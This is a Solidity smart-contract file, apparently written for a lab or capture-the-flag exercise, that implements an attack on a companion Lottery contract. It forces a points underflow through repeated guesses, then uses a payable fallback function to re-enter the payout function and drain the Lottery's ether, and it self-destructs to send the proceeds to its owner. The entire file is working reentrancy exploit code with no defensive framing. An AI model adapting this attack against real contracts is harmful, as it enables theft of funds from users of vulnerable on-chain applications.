pragma solidity ^0.6.0;

import './Lottery.sol';

contract Attacker {

    Lottery l;
    address public owner;
    uint public balance;
    uint256 public teamNumber;
    address public teamAddress;
    string public teamName;
    uint256 public teamPoints;

    event LogFallback(uint balance);
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    // call this when deploying the lottery contract in Truffle/Remix
    function initialiseAttacker(address payable _l) public {
        l = Lottery(_l);
    }

    // this registers a team with this attacking contracts address, while you
    // can register on the front-end, the payment has to come from the same
    // address you want paid back to
    function register() public {
        // TODO call reset from truffle account first
        l.registerTeam.value(2 ether)(address(this), "Attacker Team", "Password01");
    }

    // this makes a guess, repeat until correct guess or underflow occurs
    function guess() public {
        // Our A-team will be current number of teams - 1 (start from 0)
        teamNumber = l.getTeamCount() - 1;
        // need to use getTeamDetails() which unpacks the internal Team[] struct
        (teamName, teamAddress, teamPoints) = l.getTeamDetails(teamNumber);
        for (uint8 i = 0; i < 6; i++) {
            // stop in case 100+ points is reached by a lucky guess,
            // else the loop will continue untill points = 99, i.e. the attack won't work
            if (teamPoints<101) {
                l.makeAGuess(address(this), i);
            }
        }
    }

    // if the team has enough points, causes re-entry into fallback function below
    function attack() public {
        l.payoutWinningTeam();
    }
    
    function seeYa() public onlyOwner {
        selfdestruct(msg.sender);
    }

    // get paid ether, then re-enter the same Lottery function to get paid again
    // (repeats until Lottery balance is 0)
    function () external payable {
        balance += msg.value;
        if (msg.sender == address(l)) {
            emit LogFallback(balance);
            // if balance is less than 4 stop (balance will be a multiple of 2), in order to avoid reverting
            if (address(l).balance > 3 ether) {
                l.payoutWinningTeam();
            }
        }
    }

}